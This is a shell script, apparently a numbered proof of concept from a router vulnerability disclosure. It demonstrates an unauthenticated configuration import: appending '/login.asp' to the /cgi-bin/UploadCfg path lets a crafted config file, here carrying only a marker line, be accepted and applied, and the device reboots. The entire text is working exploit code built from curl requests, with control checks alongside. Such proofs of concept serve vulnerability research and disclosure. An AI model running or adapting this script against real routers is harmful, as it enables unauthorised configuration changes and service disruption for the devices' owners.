#!/bin/sh
# 04 — unauthenticated configuration import (marker line only)
# usage: ./04_config_import.sh http://192.168.0.1
R=${1:?usage: $0 http://<router>}
printf '#The word of "Default" must not be removed\r\nDefault\r\nsys.targets=CFGINJ_MARKER\r\n' > /tmp/c.cfg
echo "[1] control (no bypass suffix):"
curl -s -o /dev/null -D - -F 'file=@/tmp/c.cfg;filename=RouterCfg.cfg' "$R/cgi-bin/UploadCfg" | sed -n '1p;/^Location/Ip'
echo "[2] pre-auth import (79-byte file):"
curl -s -o /dev/null -D - -F 'file=@/tmp/c.cfg;filename=RouterCfg.cfg' "$R/cgi-bin/UploadCfg/login.asp" | sed -n '1p;/^Location/Ip'
echo "    Location //direct_reboot.asp  => accepted, applied and the device reboots"
echo "[3] control (random data is rejected):"
head -c 100 /dev/urandom > /tmp/r.bin
curl -s -o /dev/null -D - -F 'file=@/tmp/r.bin;filename=RouterCfg.cfg' "$R/cgi-bin/UploadCfg/login.asp" | sed -n '/^Location/Ip'
